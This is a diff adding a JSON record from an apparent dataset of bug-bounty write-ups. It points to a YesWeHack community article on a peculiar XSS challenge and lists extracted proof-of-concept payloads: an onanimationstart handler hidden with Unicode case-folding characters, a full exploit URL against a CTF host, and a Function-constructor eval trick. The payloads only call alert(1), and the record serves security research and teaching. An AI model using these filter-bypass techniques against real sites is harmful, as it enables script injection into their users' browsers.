@@ -1,0 +1,22 @@
+{
+  "platform": "yeswehack",
+  "vuln": "xss",
+  "url": "https://www.yeswehack.com/community/solution-for-a-weird-xss-case",
+  "title": "Cracking the Code: Unveiling a Solution for a Peculiar XSS Case | YesWeHack Community",
+  "discovered_at": "2026-04-24T13:23:57.211387+00:00",
+  "how_to_find": [
+    "Cracking the Code: Unveiling a Solution for a Peculiar XSS Case | YesWeHack Community ProductsResearchersResourcesAbout usBlogLoginContact UsChange language\nEN\nChange languageOpen main menu\nBlog"
+  ],
+  "payloads_or_poc": [
+    "Our input look like this: <ı onanimationſtart=\"alert(1)\" style=\"animation: A\"><ſtyle>@keyframes A{}</ſtyle>",
+    "<I ONANIMATIONSTART=\"ALERT(1)\" STYLE=\"ANIMATION: A\"><STYLE>@KEYFRAMES A{}</STYLE>",
+    "1name=<K id=template><ı onanimationſtart=\"alert(1)\" style=\"animation: A\" ><ſtyle>@keyframes A{}</ſtyle></K>",
+    "https://bsides2019dublin.h4cktheplanet.com/?name=<K id=template><ı onanimationſtart=”alert(1)” style=”animation: A” ><ſtyle>@keyframes A{}</ſtyle></K>",
+    "1let constructor_str = 'constructor'2let code_to_eval = 'alert(1)'3(X=>X)[constructor](code_to_eval)()",
+    "But how can we create the constructor and alert(1) string ?"
+  ],
+  "source": {
+    "fetched_at": "2026-04-24T13:23:57.211404+00:00",
+    "http_status": 200
+  }
+}
